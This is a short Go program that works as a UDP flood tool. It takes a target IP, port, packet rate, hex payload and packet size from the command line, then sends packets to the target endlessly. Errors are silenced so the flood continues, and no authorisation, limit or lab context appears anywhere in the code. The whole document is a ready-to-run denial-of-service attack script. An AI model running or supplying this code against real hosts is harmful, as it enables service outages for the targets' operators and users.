package main

import (
 "encoding/hex"
 "fmt"
 "net"
 "os"
 "strconv"
 "time"
)

func main() {
 // Check command-line arguments
 if len(os.Args) < 6 {
  fmt.Println("Usage: go run main.go <IP> <UDP Port> <Packets per Second> <UDP Payload Hex> <Packet Size>")
  return
 }

 // Get command-line arguments
 ip := os.Args[1]
 udpPort := os.Args[2]
 packetsPerSecond, err := strconv.Atoi(os.Args[3])
 if err != nil {
  fmt.Println("Invalid value for Packets per Second:", err)
  return
 }
 udpPayloadHex := os.Args[4]
 packetSize, err := strconv.Atoi(os.Args[5])
 if err != nil {
  fmt.Println("Invalid value for Packet Size:", err)
  return
 }

 // Send payload over UDP
 udpAddr, err := net.ResolveUDPAddr("udp", ip+":"+udpPort)
 if err != nil {
  fmt.Println("Failed to resolve UDP address:", err)
  return
 }

 udpConn, err := net.DialUDP("udp", nil, udpAddr)
 if err != nil {
  fmt.Println("Failed to connect to UDP server:", err)
  return
 }
 defer udpConn.Close()

 fmt.Println("Connected to UDP server")

 // Decode UDP payload from hexadecimal string
 udpPayload, err := hex.DecodeString(udpPayloadHex)
 if err != nil {
  fmt.Println("Failed to decode UDP payload hex string:", err)
  return
 }

 // Prepare packet with desired size
 packet := make([]byte, packetSize)
 copy(packet, udpPayload)

 // Calculate delay between packets
 delay := time.Second / time.Duration(packetsPerSecond)

 // Start flooding
 fmt.Printf("Flooding UDP server with %d packets per second\n", packetsPerSecond)
 for {
  // Send packet
  _, err = udpConn.Write(packet)
  if err != nil {
   //fmt.Println("Failed to send packet:", err)
   //return
  }

  time.Sleep(delay)
 }
}
